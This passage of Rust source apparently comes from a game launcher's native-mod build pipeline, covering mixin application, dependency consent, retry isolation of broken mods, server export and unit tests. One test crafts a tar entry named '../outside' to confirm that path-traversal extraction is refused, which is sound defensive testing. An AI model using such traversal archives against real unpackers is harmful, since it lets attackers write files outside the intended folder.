    check_cancelled()?;
    let plan = match prebuilt {
        Some(_) => Plan::Prebuilt,
        None => classify(
            exists,
            last_record(target, profile, platform.cache_key()).as_ref(),
            &now,
        ),
    };
    progress(Step::Plan(plan.clone(), profile));
    let mut built = Built {
        version: version.clone(),
        plan: plan.clone(),
        profile,
        secs: 0,
        left_out: if exists {
            about(&version)
                .map(|about| about.left_out)
                .unwrap_or_default()
        } else {
            left_out.clone()
        },
    };
    // The record carries each declaration's hash as the build checked it: an absent one from
    // the pinned catalog (`internals::Catalog::pinned`).
    let about = |route: &str, catalog: &internals::Catalog| {
        serde_json::json!({
            "base": origin,
            "horizon": revision,
            "horizon_mixins": mixins,
            "rust": rust_toolchain::VERSION,
            "profile": profile.name(),
            "route": route,
            "left_out": left_out.iter().map(|left| {
                let mut json = left.to_json();
                json["sha256"] = serde_json::json!(digests.get(&left.id).cloned().flatten());
                json
            }).collect::<Vec<_>>(),
            "target": target.name(),
            "rust_target": platform.target,
            "secs": started.elapsed().as_secs(),
            "mods": mods.iter().map(|m| {
                let pinned = catalog.pinned(&m.manifest);
                serde_json::json!({
                    "id": m.manifest.id,
                    "version": m.manifest.version,
                    "sha256": digests.get(&m.manifest.id).cloned().flatten(),
                    "internals": pinned.internals,
                    "inject": pinned.inject,
                })
            }).collect::<Vec<_>>(),
        })
    };
    let linker = || match target {
        // The headless build links none of the sound or controller libraries: it needs
        // only a C compiler and the C library's headers ([`rust_toolchain::linker_server`]).
        Target::Client => rust_toolchain::linker(),
        Target::Server => rust_toolchain::linker_server(),
    };
    if let Some(game) = &prebuilt {
        linker()?;
        let rust = rust_toolchain::install(|f| progress(Step::Rust(f)))?;
        progress(Step::PrebuiltMods);
        let (binary, libraries) = prebuilt::compile(
            &rust,
            game,
            &root().join("prebuilt-build"),
            &projects,
            &declared,
            &resolution,
            options.registry_consent,
        )
        .map_err(blame)?;
        check_cancelled()?;
        progress(Step::Install);
        install(
            base,
            &version,
            target,
            &binary,
            &libraries,
            &about("prebuilt", &internals::Catalog::read(game)?),
            &ordered,
        )?;
    } else if !exists {
        linker()?;
        let rust = rust_toolchain::install(|f| progress(Step::Rust(f)))?;
        check_cancelled()?;
        let needs_mixins = mods.iter().any(Bundle::needs_mixins);
        // Resolve distribution metadata before source preparation. Execution still passes
        // through the binary verifier; finding metadata alone never authorizes loading it.
        if let Ok(index) = crate::browser::horizon::index() {
            if let Some(triple) = platform
                .target
                .or_else(|| rust_toolchain::host().map(|h| h.target))
            {
                for bundle in &mods {
                    if let Some(record) = index
                        .project(&bundle.manifest.id)
                        .and_then(|p| {
                            p.versions
                                .iter()
                                .find(|v| v.version == bundle.manifest.version)
                        })
                        .and_then(|v| v.native_binary(&revision, triple).ok())
                    {
                        append_log(&trf(
                            "Registry native binary for {mod}: {url}",
                            &[("mod", &bundle.manifest.id), ("url", &record.file.url)],
                        ))?;
                    }
                }
            }
        }
        progress(Step::Source(revision.clone()));
        let source = source_for(origin, &revision)?;
        // `root()` is already the form horizon-mixins and MinGW take: resolved (no link, which
        // it refuses) and, on Windows, ASCII (which they can't read past), both by build_dir.
        let real = root();
        let fresh = real.join("stage.new");
        let _ = fs::remove_dir_all(&fresh);
        if needs_mixins {
            let key = inject_cache::key(&revision, &mixins, profile, &ordered)?;
            let snapshot = inject_cache::snapshot(&real, &key);
            if snapshot.is_dir() {
                progress(Step::CachedMixins);
                sync(&snapshot, &fresh)?;
            } else {
                let tool = tool(&rust, &mixins, &progress)?;
                let mixin_input = real.join("mixins.incoming");
                stage_mixins(&ordered, &mixin_input)?;
                let mixin_source = real.join("mixins.source");
                prepare_mixins_source(&source, &mixin_source)?;
                progress(Step::Mixins);
                let result = run_checked(
                    apply(&rust, &tool, &mixin_source, &mixin_input, &fresh),
                    "horizon-mixins",
                    |_| {},
                    None,
                    None,
                );
                let _ = fs::remove_dir_all(&mixin_input);
                let _ = fs::remove_dir_all(&mixin_source);
                if let Err(ran) = result {
                    check_cancelled()?;
                    let error = blame(ran.error);
                    return Err(match isolate::from_mixins(&ran.tail, &ordered) {
                        Some(culprit) if options.isolate => Failed::Mods {
                            left: vec![culprit],
                            error,
                            compiling: false,
                        },
                        _ => Failed::Other(error),
                    });
                }
                let parent = snapshot.parent().ok_or("invalid cache path".to_owned())?;
                fs::create_dir_all(parent).map_err(|e| e.to_string())?;
                let partial = parent.join(format!(".{key}.partial"));
                let _ = fs::remove_dir_all(&partial);
                sync(&fresh, &partial)?;
                fs::rename(&partial, &snapshot).map_err(|e| e.to_string())?;
            }
            crate::storage::mark_used(&inject_cache::snapshot(&real, &key)).map_err(cache_error)?;
        } else {
            sync(&source, &fresh)?;
        }
        // Publish the staged tree and catalog after validating the mods' sites.
        let pending = real.join("stage.pending");
        let catalog_dir = real.join("catalog.partial");
        let _ = fs::remove_dir_all(&pending);
        let _ = fs::remove_dir_all(&catalog_dir);
        fs::create_dir_all(&catalog_dir).map_err(|e| e.to_string())?;
        sync(&fresh, &pending)?;
        let mark = |tree: &Path, catalog: &Path| {
            let mut pass = cargo(&rust, tree, "run");
            pass.args([
                "--locked",
                "--release",
                "-q",
                "-p",
                "horizon-mod-api-gen",
                "--bin",
                "horizon-stage",
                "--",
            ])
            .arg(tree)
            .arg(catalog.join(inject::POINTS))
            .arg(catalog.join(internals::INTERNALS))
            .arg(horizon_mod_package::manifest::API)
            .env("CARGO_TARGET_DIR", real.join("target"));
            run(pass, "Marking the game's injection points", |_| {})?;
            internals::Catalog::read(catalog).and_then(|catalog| catalog.with_mods(mods.iter()))
        };
        // A mod pins the game as its revision ships it. horizon-mixins reprints each file it
        // edits and may add fields, which moves fingerprints, so a mixin build's catalog keeps
        // the unpatched source's fingerprint for every declaration that source has.
        let pristine = real.join("stage.pinned");
        let pinned_catalog = real.join("catalog.pinned");
        let discard = |error: String| {
            for dir in [&pending, &catalog_dir, &pristine, &pinned_catalog] {
                let _ = fs::remove_dir_all(dir);
            }
            error
        };
        let mut catalog = mark(&pending, &catalog_dir).map_err(discard)?;
        if needs_mixins {
            let _ = fs::remove_dir_all(&pinned_catalog);
            fs::create_dir_all(&pinned_catalog).map_err(|e| discard(e.to_string()))?;
            sync(&source, &pristine).map_err(discard)?;
            mark(&pristine, &pinned_catalog).map_err(discard)?;
            internals::keep_pins(&catalog_dir, &pinned_catalog).map_err(discard)?;
            let _ = fs::remove_dir_all(&pristine);
            let _ = fs::remove_dir_all(&pinned_catalog);
            catalog = internals::Catalog::read(&catalog_dir)
                .and_then(|catalog| catalog.with_mods(mods.iter()))
                .map_err(discard)?;
        }
        mods.iter()
            .try_for_each(|bundle| catalog.check(&bundle.manifest))
            .map_err(|error| discard(error.to_string()))?;
        let _ = fs::remove_dir_all(&fresh);
        fs::rename(&pending, &fresh).map_err(|error| discard(error.to_string()))?;
        for name in [
            inject::POINTS,
            horizon_mod_package::SDK_CATALOG_FILE,
            internals::INTERNALS,
        ] {
            fs::rename(catalog_dir.join(name), real.join(name))
                .map_err(|error| discard(error.to_string()))?;
        }
        let _ = fs::remove_dir_all(&catalog_dir);
        if !mods.is_empty() {
            let mut fetch = cargo(&rust, &source, "fetch");
            fetch.arg("--locked");
            run(fetch, "Downloading Horizon's crates", |_| {})?;
        }
        // Source generators add trusted game path edges. Freeze their lock before api::stage
        // inserts mod projects, and before Cargo resolves any mod-controlled dependencies.
        let game_lock = read_lock(&fresh)?;
        let game = registry_lock::RegistryLock::parse(&game_lock)?;
        let catalog = internals::Catalog::read(&real)?.with_mods(mods.iter())?;
        let has_api = api::stage(&fresh, &projects, &declared, &resolution, &catalog)?;
        for project in &projects {
            catalog.log_raw(&project.bundle.manifest)?;
        }
        let paths = mods
            .iter()
            .map(|bundle| {
                (
                    bundle.manifest.id.as_str(),
                    bundle
                        .manifest
                        .dependencies
                        .keys()
                        .map(String::as_str)
                        .collect(),
                )
            })
            .collect();
        let wanted = crates::wanted(&fresh, &paths)?;
        let dependency_plan = registry_plan::Plan::read(&game_lock, &projects, &wanted)?;
        dependency_plan.fetch(&rust, &real.join("registry-fetch"))?;
        fs::write(
            fresh.join("Cargo.lock"),
            dependency_plan.allowed.seed(&read_lock(&fresh)?)?,
        )
        .map_err(|e| e.to_string())?;
        if has_api {
            let metadata = registry_inventory::read(&rust, &fresh)
                .map_err(|error| dependency_plan.explain_resolution(error))?;
            dependency_plan
                .check_mods(&registry_lock::RegistryLock::parse(&read_lock(&fresh)?)?)?;
            let inventory = metadata.inventory(&dependency_plan.game, &[])?;
            if inventory.added_crates > 0
                && !options.registry_consent.is_some_and(|ask| ask(&inventory))
            {
                return Err(tr("Registry dependency compilation was not approved")
                    .to_owned()
                    .into());
            }
        }
        // Absolute: the compiler runs from elsewhere (`compile`).
        let stage = stage_dir(&real)?;
        sync(&fresh, &stage)?;
        let _ = fs::remove_dir_all(&fresh);
        if crates::any(&stage) || has_api {
            progress(Step::Crates);
            lock_crates(&rust, &game, &stage, &dependency_plan.allowed)?;
        }
        let mut target_dir = real.join("target");
        if let Some(cache_dir) = platform.cache_dir {
            target_dir.push(cache_dir);
        }
        let _publication = crate::run_leases::installation().map_err(cache_error)?;
        let compiled = profile;
        let profile_dir = target_dir.join(compiled.cargo().0);
        fs::create_dir_all(&profile_dir).map_err(|error| Failed::Other(error.to_string()))?;
        crate::storage::mark_used(&profile_dir)
            .map_err(|error| Failed::Other(cache_error(error)))?;
        crate::run_leases::publish(&profile_dir).map_err(cache_error)?;
        let (mut crates, mut total, mut name) = (0, None, String::new());
        let declared_injections = Vec::new();
        let identities: Vec<_> = mods
            .iter()
            .map(|m| (m.manifest.id.clone(), m.manifest.version.clone()))
            .collect();
        run_checked(
            compile(
                &rust,
                &stage,
                target,
                &target_dir,
                compiled,
                api::game_package(&stage, target, has_api),
            ),
            "Compiling the game",
            |line| {
                for event in parse_cargo(line) {
                    match event {
                        Cargo::Compiling(n) => {
                            crates += 1;
                            name = n;
                        }
                        Cargo::Progress(done, all) => {
                            crates = crates.max(done);
                            total = Some(all);
                        }
                    }
                    if !name.is_empty() {
                        progress(Step::Compile {
                            done: crates,
                            total,
                            name: name.clone(),
                            profile: compiled,
                        });
                    }
                }
            },
            Some(diagnostics::Compiler {
                stage: &stage,
                source: &source,
                mods: &identities,
                declared: &declared_injections,
            }),
            None,
        )
        .map_err(|ran| {
            let error = blame(crates::locked(ran.error));
            if CANCEL.load(Ordering::Relaxed) {
                return Failed::Other(CANCELLED.into());
            }
            match isolate::from_compiler(&ran.owners, &mods) {
                left if options.isolate && !left.is_empty() => Failed::Mods {
                    left,
                    error,
                    compiling: true,
                },
                _ => Failed::Other(error),
            }
        })?;
        check_cancelled()?;
        api::as_client(
            &stage,
            target,
            has_api,
            &target_dir.join(compiled.cargo().0),
        )?;
        let binary = target_dir.join(compiled.cargo().0).join(backend::CLIENT);
        if let Some(expected) = platform.machine {
            let actual = pe_machine(&binary).map_err(|error| {
                trf(
                    "Could not read {name}: {error}",
                    &[("name", &binary.display().to_string()), ("error", &error)],
                )
            })?;
            if actual != expected {
                return Err(architecture_mismatch(
                    &format!("PE machine 0x{expected:04x}"),
                    &format!("PE machine 0x{actual:04x}"),
                )
                .into());
            }
        }
        save_record(target, profile, platform.cache_key(), &now);
        progress(Step::Install);
        install(
            base,
            &version,
            target,
            &binary,
            &[],
            &about("source", &catalog),
            &ordered,
        )?;
    } else {
        // Used again: it counts as the newest of the builds kept (`prune`).
        let _ = fs::write(target.directory(&version).join(".installed"), "");
    }
    let _ = fs::remove_dir_all(&incoming);
    built.secs = started.elapsed().as_secs();
    Ok(built)
}

/// How many times a build compiles again without the mods the compiler's errors were traced to:
/// each costs a compile, where a mod that doesn't apply costs only horizon-mixins' run.
const COMPILE_RETRIES: usize = 3;

/// Runs `pipeline` until it builds, each time without the mods that stopped it before (they
/// are said with `progress` as they are left out, and those needing them once it built). The
/// error, when it can't, starts with the mods already left out.
fn isolated(
    mut pipeline: impl FnMut(&[LeftOut]) -> Result<Built, Failed>,
    progress: &impl Fn(Step),
) -> Result<Built, String> {
    let mut skip: Vec<LeftOut> = Vec::new();
    let mut compiles = 0;
    let mut last = String::new();
    let said = |skip: &[LeftOut], error: String| {
        let labels: Vec<String> = skip.iter().map(LeftOut::label).collect();
        match labels.is_empty() {
            true => error,
            false => format!("{}\n\n{error}", labels.join("\n")),
        }
    };
    loop {
        match pipeline(&skip) {
            Ok(built) => {
                for left in built.left_out.iter().filter(|l| !skip.contains(l)) {
                    log_warning(&left.label());
                    progress(Step::LeftOut(left.clone()));
                }
                return Ok(built);
            }
            Err(Failed::Mods {
                left,
                error,
                compiling,
            }) => {
                compiles += usize::from(compiling);
                let new: Vec<LeftOut> = left
                    .into_iter()
                    .filter(|l| !skip.iter().any(|s| s.id == l.id))
                    .collect();
                if new.is_empty() || compiles > COMPILE_RETRIES {
                    return Err(said(&skip, error));
                }
                for left in new {
                    log_warning(&left.label());
                    progress(Step::LeftOut(left.clone()));
                    skip.push(left);
                }
                last = error;
            }
            Err(Failed::Nothing) => return Err(said(&skip, last)),
            Err(Failed::NoConsent) => return Err(Failed::NoConsent.into()),
            Err(Failed::Other(error)) if error == CANCELLED => return Err(error),
            Err(Failed::Other(error)) => return Err(said(&skip, error)),
        }
    }
}

fn select_build_profile(
    saved: Profile,
    requested: Option<Profile>,
    plan: impl FnOnce() -> Result<Routes, Failed>,
) -> Result<Profile, String> {
    check_cancelled()?;
    match requested {
        Some(profile) => Ok(profile),
        None => {
            let routes = plan();
            check_cancelled()?;
            Ok(saved.for_picker(&routes.map_err(String::from)?, false, false))
        }
    }
}

/// Builds `folder`'s mods on the Horizon revision they pin (else `base`'s, the installed version
/// whose game files the build reuses: a native build's own revision when it is one, [`base_for`])
/// and points `instance` at the build, the default one included. Returns the build's version; a
/// build already made is used again. Mods pinning different revisions cannot build together:
/// the error starts with [`MISMATCH`] and names them; `cargo horizon-mod update --horizon
/// <commit>` in each mod's folder pins it to the installed game, then build again.
/// `profile` is an explicit override; None applies the instance's choice only when needed.
pub fn build(
    base: &str,
    folder: &Path,
    instance: &Instance,
    profile: Option<Profile>,
    progress: impl Fn(Step),
    registry_consent: impl Fn(&RegistryInventory) -> bool,
) -> Result<String, Failed> {
    require_consent()?;
    CANCEL.store(false, Ordering::Relaxed);
    if let Some(error) = backend::native_mod_architecture_error() {
        return Err(Failed::Other(error));
    }
    logged(|cache| {
        let profile = select_build_profile(instance.native_profile, profile, || {
            planning::classify(
                folder,
                Some(base),
                cache.map_err(|error| Failed::Other(error.into()))?,
            )
        })?;
        let built = isolated(
            |skip| {
                pipeline(
                    base,
                    folder,
                    profile,
                    Target::Client,
                    BuildOptions {
                        skip,
                        isolate: true,
                        registry_consent: Some(&registry_consent),
                        ..BuildOptions::default()
                    },
                    &progress,
                )
            },
            &progress,
        )?;
        check_cancelled()?;
        instances::edit(&instance.id, |meta| {
            meta.version = Some(built.version.clone())
        })?;
        // logged() runs central eviction under the retained build lease.
        if built.plan != Plan::UpToDate {
            progress(Step::Done {
                secs: built.secs,
                profile: built.profile,
                plan: built.plan,
            });
        }
        Ok(built.version)
    })
    .map_err(Failed::Other)
}

/// Builds `folder`'s mods as the headless engine a dedicated server runs (`horizon-engine`,
/// docs/server.md): the same pipeline as [`build`] on the same revision, compiled with
/// `--no-default-features`, installed as its own version (its key distinct from the game's, so
/// the two never stand in for each other) and exported into `output` as a standalone runtime
/// folder: the built engine, the base version's resources and the build's record. The folder
/// lives outside the launcher's managed versions, where nothing of the launcher's can remove
/// it; nothing of it is overwritten, and a folder already at `output`
/// is refused before anything is downloaded or compiled. No instance is edited and no version
/// selected: a server build changes nothing the launcher's window plays. Returns the absolute
/// path of the exported engine binary.
pub fn build_server(
    base: &str,
    folder: &Path,
    output: &Path,
    profile: Profile,
    allow_jar_downloads: bool,
    progress: impl Fn(Step),
    registry_consent: impl Fn(&RegistryInventory) -> bool,
) -> Result<PathBuf, Failed> {
    require_consent()?;
    logged(|_| {
        if output.symlink_metadata().is_ok() {
            return Err(trf(
                "{path} already exists. Move it away, or build into another folder.",
                &[("path", &output.display().to_string())],
            ));
        }
        let parent = output
            .parent()
            .filter(|p| !p.as_os_str().is_empty())
            .unwrap_or(Path::new("."));
        fs::create_dir_all(parent).map_err(|e| e.to_string())?;
        let output = parent.canonicalize().map_err(|e| e.to_string())?.join(
            output
                .file_name()
                .ok_or_else(|| tr("Choose a new folder for the server export."))?,
        );
        for managed in [backend::version_dir(""), root()] {
            if managed
                .canonicalize()
                .is_ok_and(|dir| output.starts_with(dir))
            {
                return Err(tr("Export the server outside the launcher's managed folders.").into());
            }
        }
        let built = pipeline(
            base,
            folder,
            profile,
            Target::Server,
            BuildOptions {
                allow_jar_downloads,
                registry_consent: Some(&registry_consent),
                ..BuildOptions::default()
            },
            &progress,
        )
        .map_err(String::from)?;
        export(&Target::Server.directory(&built.version), &output)?;
        // logged() runs central eviction under the retained build lease.
        if built.plan != Plan::UpToDate {
            progress(Step::Done {
                secs: built.secs,
                profile: built.profile,
                plan: built.plan,
            });
        }
        let engine = output.join(Target::Server.binary());
        Ok(std::path::absolute(&engine).unwrap_or(engine))
    })
    .map_err(Failed::Other)
}

/// Copies the built version folder `from` into `output` (outside the managed versions) as one
/// piece: staged in a hidden folder beside `output`, then renamed into place, so an interrupted
/// export leaves nothing half-written at `output` and overwrites nothing already there.
/// Executable files keep their permissions ([`backend::copy_dir`], a clone where the disk can).
fn export(from: &Path, output: &Path) -> Result<(), String> {
    let name = output.file_name().ok_or_else(|| {
        trf(
            "{path} is not a folder to build into.",
            &[("path", &output.display().to_string())],
        )
    })?;
    let parent = output.parent().unwrap_or(output);
    fs::create_dir_all(parent).map_err(|e| format!("{}: {e}", parent.display()))?;
    let staging = parent.join(format!(
        ".{}.{}.exporting",
        name.to_string_lossy(),
        std::process::id()
    ));
    fs::create_dir(&staging).map_err(|e| format!("{}: {e}", staging.display()))?;
    if let Err(e) = copy_runtime(from, &staging) {
        let _ = fs::remove_dir_all(&staging);
        return Err(trf(
            "Could not copy the build: {error}",
            &[("error", &e.to_string())],
        ));
    }
    if output.symlink_metadata().is_ok() {
        let _ = fs::remove_dir_all(&staging);
        return Err(trf(
            "{path} already exists. Move it away, or build into another folder.",
            &[("path", &output.display().to_string())],
        ));
    }
    fs::rename(&staging, output).map_err(|e| {
        let _ = fs::remove_dir_all(&staging);
        trf(
            "Could not move the build to {path}: {error}",
            &[
                ("path", &output.display().to_string()),
                ("error", &e.to_string()),
            ],
        )
    })
}

/// Reflinks are independent files but may not preserve executable permissions.
fn copy_runtime(from: &Path, to: &Path) -> std::io::Result<()> {
    fs::create_dir_all(to)?;
    for entry in fs::read_dir(from)? {
        let entry = entry?;
        let destination = to.join(entry.file_name());
        if entry.file_type()?.is_dir() {
            copy_runtime(&entry.path(), &destination)?;
        } else {
            horizon_prepare::clone_or_copy(&entry.path(), &destination)?;
            fs::set_permissions(&destination, entry.metadata()?.permissions())?;
        }
    }
    Ok(())
}

/// Installs `binary` as version `version`, retaining the base's runtime helpers. Clients
/// reference the base's prepared resources; standalone server exports still carry their own.
mod installation;
use installation::install;

/// Copies version folder `from` into `to` but for what a new build of `target` makes its own
/// ([`carried_over`]), cloned where the disk can. Also an imported build's start (`build_import`).
pub(crate) fn copy_base(
    from: &Path,
    to: &Path,
    target: Target,
    share_resources: bool,
) -> Result<(), String> {
    for entry in fs::read_dir(from).map_err(|e| e.to_string())?.flatten() {
        let name = entry.file_name();
        if !carried_over(&name, target) || (share_resources && name == ".local") {
            continue;
        }
        let to = to.join(&name);
        let copied = if entry.path().is_dir() {
            backend::copy_dir(&entry.path(), &to)
        } else {
            // A clone is a new file: horizon-ctl and horizon-server keep their permissions.
            horizon_prepare::clone_or_copy(&entry.path(), &to)
                .and_then(|()| fs::set_permissions(&to, entry.metadata()?.permissions()))
        };
        copied.map_err(|e| format!("Could not copy {}: {e}", entry.path().display()))?;
    }
    Ok(())
}

/// Whether a file of the version a build starts from goes into the new build. The game (the
/// target's own binary), its record, and unsupported `native-data/` artifacts are not carried
/// over. A server build is the headless engine: it keeps neither the game's own binary
/// nor any `horizon-engine` the base shipped, which would run unmodded beside its own.
fn carried_over(name: &std::ffi::OsStr, target: Target) -> bool {
    let mut own: Vec<String> = [
        "Horizon.app",
        "native-mods.json",
        "native-data",
        horizon_mod_package::mod_list::NATIVE_DIR,
    ]
    .iter()
    .map(|s| s.to_string())
    .collect();
    own.push(backend::CLIENT.to_string());
    own.push(".installed".to_string());
    if target == Target::Server {
        own.push("horizon-engine".to_string());
    }
    let named = |n: &str| name == std::ffi::OsStr::new(n);
    !own.iter()
        .any(|n| named(n) || named(&format!("{n}{}", std::env::consts::EXE_SUFFIX)))
}

#[cfg(test)]
mod tests {

    use super::*;

    #[test]
    fn source_archive_escape_is_refused_without_writing_outside() {
        let folder = tempfile::tempdir().unwrap();
        let mut header = tar::Header::new_gnu();
        header.set_size(1);
        header.set_mode(0o644);
        header.as_mut_bytes()[..10].copy_from_slice(b"../outside");
        header.set_cksum();
        let mut archive = tar::Builder::new(Vec::new());
        archive.append(&header, &b"x"[..]).unwrap();
        let bytes = archive.into_inner().unwrap();
        let inside = folder.path().join("inside");
        fs::create_dir(&inside).unwrap();
        assert!(unpack_source(bytes.as_slice(), &inside).is_err());
        assert!(!folder.path().join("outside").exists());
    }

    #[test]
    fn developer_native_build_uses_local_only_commit_without_source_network() {
        let folder = tempfile::tempdir().unwrap();
        let repo = folder.path().join("checkout");
        fs::create_dir(&repo).unwrap();
        let git = |args: &[&str]| {
            let output = Command::new("git")
                .current_dir(&repo)
                .args(args)
                .output()
                .unwrap();
            assert!(
                output.status.success(),
                "{}",
                String::from_utf8_lossy(&output.stderr)
            );
            output.stdout
        };
        git(&["init", "-q"]);
        fs::write(repo.join("Cargo.toml"), "[workspace]\n").unwrap();
        #[cfg(unix)]
        std::os::unix::fs::symlink("Cargo.toml", repo.join("CLAUDE.md")).unwrap();
        git(&["add", "--all"]);
        git(&[
            "-c",
            "user.name=Test",
            "-c",
            "user.email=test@example.invalid",
            "commit",
            "-qm",
            "local only",
        ]);
        let revision = String::from_utf8(git(&["rev-parse", "HEAD"]))
            .unwrap()
            .trim()
            .to_owned();
        // Git archive applies core.autocrlf even though the blob is LF. Exercise the real
        // developer snapshot boundary with Windows-style config and keep the byte assertion.
        git(&["config", "core.autocrlf", "true"]);
        let (snapshot_revision, snapshot) =
            crate::developer_install::committed_snapshot(&repo).unwrap();
        assert_eq!(snapshot_revision, revision);
        let archive = folder.path().join("source.tar");
        fs::write(&archive, snapshot).unwrap();
        let destination = folder.path().join("cache/source");
        let result = source_or_local(Some(&archive), &destination, &revision, || {
            panic!("developer source must never request GitHub")
        })
        .unwrap();
        assert_eq!(
            fs::read_to_string(result.join("Cargo.toml")).unwrap(),
            "[workspace]\n"
        );
        assert_eq!(
            fs::read_to_string(result.join(".horizon-revision")).unwrap(),
            revision
        );
        assert!(!result.join("CLAUDE.md").exists());
        assert!(source_or_local(
            Some(&folder.path().join("missing.tar")),
            &folder.path().join("missing-cache"),
            &revision,
            || panic!("missing local source must not fall back to GitHub")
        )
        .is_err());
    }

    /// The player's route, from a fresh data folder with nothing registered by hand: the
    /// launcher's own install of a release, a native build on it, then an update to a newer
    /// release and a switch to it. The native build reads its base's resources throughout.
    #[test]
    fn a_native_build_starts_from_a_release_the_launcher_installed() {
        use std::io::Write;
        use std::net::TcpListener;
        if std::env::var_os("HORIZON_PLAYER_FLOW_CHILD").is_none() {
            let home = tempfile::tempdir().unwrap();
            let status = Command::new(std::env::current_exe().unwrap())
                .args([
                    "--exact",
                    "native_mods::tests::a_native_build_starts_from_a_release_the_launcher_installed",
                ])
                .env("HORIZON_PLAYER_FLOW_CHILD", "1")
                .env("HORIZON_LAUNCHER_HOME", home.path().join("launcher"))
                .env("HORIZON_HOME", home.path().join("home"))
                .env("XDG_DATA_HOME", home.path().join("data"))
                .env("XDG_CONFIG_HOME", home.path().join("config"))
                .env("HORIZON_LAUNCHER_NO_SELF_UPDATE", "1")
                .status()
                .unwrap();
            assert!(status.success());
            return;
        }
        // A release archive as GitHub serves it: one top folder holding the game.
        let mut archive = Vec::new();
        {
            let mut tar = tar::Builder::new(flate2::write::GzEncoder::new(
                &mut archive,
                flate2::Compression::fast(),
            ));
            let game = b"release game";
            let mut header = tar::Header::new_gnu();
            header.set_size(game.len() as u64);
            header.set_mode(0o755);
            header.set_cksum();
            tar.append_data(
                &mut header,
                format!("horizon-linux-x86_64/{}", backend::CLIENT),
                &game[..],
            )
            .unwrap();
            tar.into_inner().unwrap().finish().unwrap();
        }
        let sha256: String =
            sha2::Digest::finalize(<sha2::Sha256 as sha2::Digest>::new_with_prefix(&archive))
                .iter()
                .map(|b| format!("{b:02x}"))
                .collect();
        let install_release = |tag: &str| {
            let listener = TcpListener::bind("127.0.0.1:0").unwrap();
            let url = format!(
                "http://{}/horizon-linux-x86_64.tar.gz",
                listener.local_addr().unwrap()
            );
            let body = archive.clone();
            let server = std::thread::spawn(move || {
                let (mut stream, _) = listener.accept().unwrap();
                let mut request = [0; 4096];
                let _ = std::io::Read::read(&mut stream, &mut request);
                write!(
                    stream,
                    "HTTP/1.1 200 OK\r\nContent-Length: {}\r\nConnection: close\r\n\r\n",
                    body.len()
                )
                .unwrap();
                stream.write_all(&body).unwrap();
            });
            let release = backend::Release {
                tag: tag.into(),
                name: tag.into(),
                body: String::new(),
                date: String::new(),
                time: String::new(),
                asset: Some((url, archive.len() as u64)),
                prerelease: false,
                nightly: None,
            };
            backend::install_as(&release, tag, &sha256, None, |_| {}).unwrap();
            server.join().unwrap();
            // `horizon-launcher prepare` writes the resources from the player's own Minecraft.
            let resources = backend::resources(tag);
            fs::create_dir_all(&resources).unwrap();
            fs::write(resources.join("horizon-resources.json"), b"{}").unwrap();
        };
        let (old, new) = ("v2026.11.01", "v2026.11.02");
        // (a) A fresh install: the release is the build's base, chosen as the launcher chooses.
        install_release(old);
        let base = base_for(None, &backend::installed(), false).unwrap();
        assert_eq!(base, old);
        let binary = dir("player-flow").join("built");
        fs::write(&binary, b"native game").unwrap();
        let native = "native-player-flow";
        install(
            &base,
            native,
            Target::Client,
            &binary,
            &[],
            &serde_json::json!({"base": base, "horizon": "0".repeat(40), "target": "client"}),
            &[],
        )
        .unwrap();
        backend::need_prepared(native).unwrap();
        assert_eq!(backend::resources(native), backend::resources(old));
        // (b) An update: a newer release arrives, and a rebuild with `update` moves to it. The
        // build made before it still plays, on the base it was made from, which stays installed.
        install_release(new);
        assert_eq!(
            base_for(Some(native), &backend::installed(), true).as_deref(),
            Some(new)
        );
        assert_eq!(
            update_for(native, &backend::installed()).as_deref(),
            Some(new)
        );
        backend::need_prepared(native).unwrap();
        assert!(backend::remove_version(old).unwrap_err().contains(native));
        // (c) Switching the selected version leaves the build and its base as they are.
        let mut settings = backend::Settings::load();
        settings.selected = Some(new.into());
        settings.save().unwrap();
        backend::need_prepared(native).unwrap();
        assert_eq!(backend::resources(native), backend::resources(old));
    }

    #[test]
    fn isolation_keeps_cancellation_exact_after_a_retry() {
        let _guard = TEST_STATE.lock().unwrap();
        let mut attempts = 0;
        let result = isolated(
            |skip| {
                attempts += 1;
                if skip.is_empty() {
                    return Err(Failed::Mods {
                        left: vec![LeftOut {
                            id: "broken".into(),
                            version: "1.0.0".into(),
                            why: isolate::Why::OtherVersion,
                        }],
                        error: "compiler failure".into(),
                        compiling: true,
                    });
                }
                assert_eq!(skip[0].id, "broken");
                Err(Failed::Other(CANCELLED.into()))
            },
            &|_| {},
        );
        assert_eq!(result.unwrap_err(), CANCELLED);
        assert_eq!(attempts, 2);
    }

    #[test]
    fn isolation_bounds_recompiles_and_keeps_the_failure() {
        let _guard = TEST_STATE.lock().unwrap();
        let mut attempts = 0;
        let result = isolated(
            |skip| {
                attempts += 1;
                assert_eq!(skip.len(), attempts - 1);
                Err(Failed::Mods {
                    left: vec![LeftOut {
                        id: format!("broken_{attempts}"),
                        version: "1.0.0".into(),
                        why: isolate::Why::OtherVersion,
                    }],
                    error: "compiler failure".into(),
                    compiling: true,
                })
            },
            &|_| {},
        );
        let error = result.unwrap_err();
        assert_eq!(attempts, COMPILE_RETRIES + 1);
        assert!(error.contains("broken_1 was left out"), "{error}");
        assert!(error.ends_with("compiler failure"), "{error}");
    }

    #[test]
    fn pe_machine_reads_the_architecture_after_validating_both_headers() {
        let dir = dir("pe-machine");
        let executable = dir.join("game.exe");
        let mut image = vec![0; 70];
        image[..2].copy_from_slice(b"MZ");
        image[0x3c..0x40].copy_from_slice(&64_u32.to_le_bytes());
        image[64..68].copy_from_slice(b"PE\0\0");
        image[68..70].copy_from_slice(&rust_toolchain::WINDOWS_ARM64_MACHINE.to_le_bytes());
        fs::write(&executable, &image).unwrap();
        assert_eq!(pe_machine(&executable).unwrap(), 0xaa64);

        image[64] = b'X';
        fs::write(&executable, image).unwrap();
        assert!(pe_machine(&executable)
            .unwrap_err()
            .contains("missing PE signature"));
        let _ = fs::remove_dir_all(dir);
    }

    #[test]
    fn windows_build_platform_follows_the_selected_games_pe_machine() {
        let x64 = windows_build_platform(
            rust_toolchain::WINDOWS_X64_MACHINE,
            rust_toolchain::WINDOWS_X64_TARGET,
        )
        .unwrap();
        assert_eq!(x64.target, Some(rust_toolchain::WINDOWS_X64_TARGET));
        assert_eq!(x64.machine, Some(rust_toolchain::WINDOWS_X64_MACHINE));
        assert_eq!(x64.cache_key(), None, "preserve the x64 cache layout");

        let arm64 = windows_build_platform(
            rust_toolchain::WINDOWS_ARM64_MACHINE,
            rust_toolchain::WINDOWS_ARM64_TARGET,
        )
        .unwrap();
        assert_eq!(arm64.target, Some(rust_toolchain::WINDOWS_ARM64_TARGET));
